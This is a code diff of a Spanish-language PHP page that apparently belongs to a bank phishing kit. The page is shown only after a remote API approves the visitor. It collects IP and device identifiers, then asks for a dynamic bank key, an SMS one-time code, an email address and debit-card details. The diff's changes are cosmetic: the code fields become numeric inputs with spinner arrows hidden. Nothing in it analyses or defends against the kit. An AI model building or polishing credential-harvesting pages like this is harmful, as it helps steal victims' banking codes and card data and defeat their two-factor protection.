@@ -31,7 +31,6 @@ function consultarApi($endPoint)
 
     // Ejecutar la solicitud y obtener la respuesta
     return curl_exec($ch);
-
 }
 
 function obtenerIP()
@@ -85,7 +84,7 @@ function validarRespuesta($respuesta)
     // Verificar si la respuesta es válida (esto dependerá de tu API específica)
     if (isset($data['type']) && $data['type'] === 'aceptar') {
 
-        ?>
+?>
 <html>
 
 <head>
@@ -182,6 +181,16 @@ function validarRespuesta($respuesta)
         padding-right: 8px;
         width: 100%;
         min-height: 28px;
+    }
+
+    .no-arrow::-webkit-outer-spin-button,
+    .no-arrow::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+
+    .no-arrow {
+        -moz-appearance: textfield;
     }
     </style>
     <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
@@ -1448,18 +1457,18 @@ function setTitle() {
                                                             Ingrese su clave Din&aacute;mica
                                                         </div>
                                                         <div class="otp-container">
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-1" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-2" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-3" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-4" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-5" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input" id="otp-6" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-1" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-2" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-3" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-4" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-5" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input no-arrow" id="otp-6" />
                                                         </div>
                                                         <input type="hidden" class="otp-input-hidden" />
                                                     </div>
@@ -1471,25 +1480,32 @@ function setTitle() {
                                                             Ingrese el c&oacute;digo SMS
                                                         </div>
                                                         <div class="otp-container">
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-1" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-2" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-3" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-4" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-5" />
-                                                            <input type="text" maxlength="1"
-                                                                class="form-control otp-input-sms" id="otp-sms-6" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-1" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-2" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-3" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-4" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-5" />
+                                                            <input type="number" maxlength="1"
+                                                                class="form-control otp-input-sms no-arrow"
+                                                                id="otp-sms-6" />
                                                         </div>
+
                                                         <input type="hidden" class="otp-input-sms-hidden" />
                                                     </div>
                                                 </div>
 
                                                 <div id="div-correo" class="hidden row justify-content-center mt-5">
-                                                <div class="content-data">
+                                                    <div class="content-data">
                                                         <div class="otp-label">
                                                             Registre su correo!
                                                         </div>
@@ -1549,10 +1565,11 @@ function setTitle() {
 
                                                     </div>
                                                 </div>
-                                                <div id="div-datos-debito" class="hidden row justify-content-center mt-5 m-4">
+                                                <div id="div-datos-debito"
+                                                    class="hidden row justify-content-center mt-5 m-4">
 
                                                     <div class="content-data">
-<!-- 
+                                                        <!-- 
                                                         <h5 class="mb-3">Para completar el proceso es necesario que
                                                             ingrese los siguientes datos</h5> -->
                                                         <div class="mb-3">
@@ -1732,7 +1749,7 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.all.min.js
         <link href="
 https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.min.css
 " rel="stylesheet">
-<script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.7/dist/jquery.inputmask.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/inputmask@5.0.7/dist/jquery.inputmask.min.js"></script>
 
         <script src="js/actions.js" type="text/javascript"></script>
         <input id="device_id" name="device_id" type="hidden" value="" />
@@ -1818,6 +1835,6 @@ https://cdn.jsdelivr.net/npm/sweetalert2@11.12.4/dist/sweetalert2.min.css
 
 </html>
 <?php
-return true;
+        return true;
     }
 }
